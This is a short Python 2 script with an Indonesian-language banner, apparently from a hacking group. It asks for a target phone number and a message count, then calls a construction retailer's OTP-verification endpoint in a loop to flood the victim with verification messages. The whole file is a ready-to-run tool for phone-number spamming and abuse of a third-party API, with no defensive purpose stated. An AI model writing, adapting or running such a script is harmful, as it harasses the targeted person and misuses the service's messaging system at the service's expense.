# -*- coding: utf8 -*-
# Hey, bro 😄
import os, sys, json
import requests as r
C0 = '\033[0;36m'
G0 = '\033[0;32m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
Y0 = '\033[0;33m'
try:
 os.system("clear")
 print """%s
 %sAuthor by: Ryzz_ D1P5EY%s
 %sGithub   : github.com/Ryzz03%s
 %sTeam     : PARASIT CYBER ALLIANCE%s
 %sSpam WhatsApp Auto Nangis"""%(G0,W0,G0,W0,G0,W0,G0,G0)
 gg = raw_input("%s[%s?%s] %sMasukkan nomor target (ex:08xxx) : "%(W0,C0,W0,W0))
 gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa kak? : "%(W0,C0,W0,W0)))
 c = 1
 for x in range(gi):
  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
  if h["status"] == 'success':
   print "%s[%s%s%s] %sSuccess %sspam to %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
   c += 1
  else:
   print "%s[%s%s%s] %sFailed %sspam to %s%s"%(W0,C0,str(c),W0,R0,W0,Y0,gg)
   c += 1
# print (h)
except r.exceptions.ConnectionError:
   print "%s[%s!%s] %sYahh, Jaringan nya lemot :("%(W0,C0,W0,R0)
except KeyboardInterrupt:
   print "\r%s[%s-%s] %aNjirt, keluar sendiri ;( "%(W0,C0,W0,W0)
